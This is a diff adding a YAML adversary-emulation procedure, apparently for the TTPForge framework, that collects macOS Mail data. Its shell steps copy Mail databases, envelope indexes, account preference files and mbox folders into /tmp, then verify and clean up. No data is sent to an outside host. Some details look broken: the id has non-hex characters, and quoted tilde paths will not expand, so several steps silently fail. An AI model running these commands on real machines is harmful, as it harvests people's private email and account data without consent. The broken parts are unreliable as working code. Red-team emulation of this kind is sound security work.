@@ -1,0 +1,97 @@
+id: 3d9a5c4b-6f8h-0i1j-2k3l-4m5n6o7p8q9r
+api_version: 2.0
+metadata:
+  name: Access Mail Application Data
+  description: Extract and collect data from the macOS Mail application
+  author: TTPForge
+  created: 2026-01-30
+  updated: 2026-01-30
+  tags:
+    - collection
+    - email
+    - mail
+    - reconnaissance
+  
+requirements:
+  platforms:
+    - os: darwin
+  
+args:
+  output_path:
+    description: Output path for Mail data
+    type: string
+    default: "/tmp/mail_data"
+  
+  mailbox_filter:
+    description: Filter mailboxes by name
+    type: string
+    default: "*"
+
+steps:
+  - name: Create output directory
+    command: mkdir -p {{ output_path }}
+
+  - name: Collect Mail database
+    command: |
+      mail_path="~/Library/Mail\ Downloads"
+      if [ -d "$mail_path" ]; then
+        cp -r "$mail_path" "{{ output_path }}/mail_downloads" 2>/dev/null || true
+      fi
+
+  - name: Extract V series Mail data
+    command: |
+      v_mail_path="~/Library/Mail/V*/MailData"
+      if ls "$v_mail_path" 1> /dev/null 2>&1; then
+        mkdir -p {{ output_path }}/mail_v_series
+        find "$v_mail_path" -name "*.db" -o -name "*.plist" | xargs -I {} cp {} {{ output_path }}/mail_v_series/ 2>/dev/null || true
+      fi
+
+  - name: Collect Mail envelope index
+    command: |
+      find ~/Library/Mail* -name "Envelope Index*" 2>/dev/null | xargs -I {} cp {} {{ output_path }}/ 2>/dev/null || true
+
+  - name: Extract mailbox account information
+    command: |
+      find ~/Library -name "com.apple.mail*" -type f 2>/dev/null | xargs -I {} cp {} {{ output_path }}/ 2>/dev/null || true
+
+  - name: Collect Mail message data
+    command: |
+      mkdir -p {{ output_path }}/messages
+      find ~/Library/Mail* -name "*.mbox" -type d 2>/dev/null | head -5 | xargs -I {} cp -r {} {{ output_path }}/messages/ 2>/dev/null || true
+
+  - name: List collected Mail data
+    command: ls -lah {{ output_path }}/
+
+checks:
+  - name: Verify output directory
+    command: test -d {{ output_path }} && echo "Mail output directory created"
+    expected_output: "Mail output directory created"
+
+  - name: Check for collected mailbox data
+    command: |
+      count=$(find {{ output_path }} -type f 2>/dev/null | wc -l)
+      if [ "$count" -gt 0 ]; then
+        echo "Collected $count files"
+      else
+        echo "No mailbox data found (expected on system without Mail)"
+      fi
+
+  - name: Verify database files
+    command: |
+      db_files=$(find {{ output_path }} -name "*.db" 2>/dev/null | wc -l)
+      echo "Database files collected: $db_files"
+
+tests:
+  - name: default
+    description: Default test with dry run
+    dry_run: true
+    steps:
+      - name: Verify Mail application
+        command: test -d /Applications/Mail.app && echo "Mail app installed"
+
+cleanup:
+  - name: Remove Mail data
+    command: rm -rf {{ output_path }}
+
+  - name: Verify cleanup
+    command: test ! -d {{ output_path }} && echo "Mail data cleanup completed"
